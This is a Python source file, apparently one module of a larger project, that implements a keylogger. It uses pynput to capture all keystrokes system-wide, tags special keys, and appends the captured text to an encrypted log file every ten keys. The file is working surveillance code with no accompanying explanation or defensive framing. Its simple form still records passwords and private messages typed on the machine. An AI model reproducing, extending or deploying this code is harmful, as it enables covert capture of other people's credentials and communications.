import os

from pynput.keyboard import Key, Listener
from .crypt import Crypt
from threading import Thread


class KeyLogger:
    MAX_KEY_LENGTH = 10
    keys = ""
    count = 0
    crypt = Crypt()

    def on_press(self, key):
        key = str(key)
        if "space" in key:
            KeyLogger.keys += "[SPACE]"
        elif "enter" in key:
            KeyLogger.keys += "\n"
        elif "shift" in key:
            KeyLogger.keys += "[SHIFT]"
        elif "ctrl" in key:
            KeyLogger.keys += "[CTRL]"
        elif "alt" in key:
            KeyLogger.keys += "[ALT]"
        elif '"\'"' == key:
            KeyLogger.keys += "'"
        elif "'\"'" == key:
            KeyLogger.keys += '"'
        elif "key" not in key.lower():
            KeyLogger.keys += key.replace("'", "")

        KeyLogger.count += 1
        print(f"{key} pressed")

        if KeyLogger.count >= KeyLogger.MAX_KEY_LENGTH:
            self.write_file()
            KeyLogger.keys = ""
            KeyLogger.count = 0

    def read_file(self):
        if not os.path.exists("files/log.txt"):
            open("files/log.txt", "x")

        with open("files/log.txt", "rb") as enc_file:
            encrypted_log_byte = enc_file.read()

        if encrypted_log_byte:
            return KeyLogger.crypt.decrypt(encrypted_log_byte).decode("utf-8")

        return ""

    def write_file(self):
        final_log = self.read_file() + KeyLogger.keys

        with open("files/log.txt", "wb") as f:
            f.write(KeyLogger.crypt.encrypt(str.encode(final_log)))

    def on_release(self, key):
        if key == Key.esc:
            return False

    def run(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
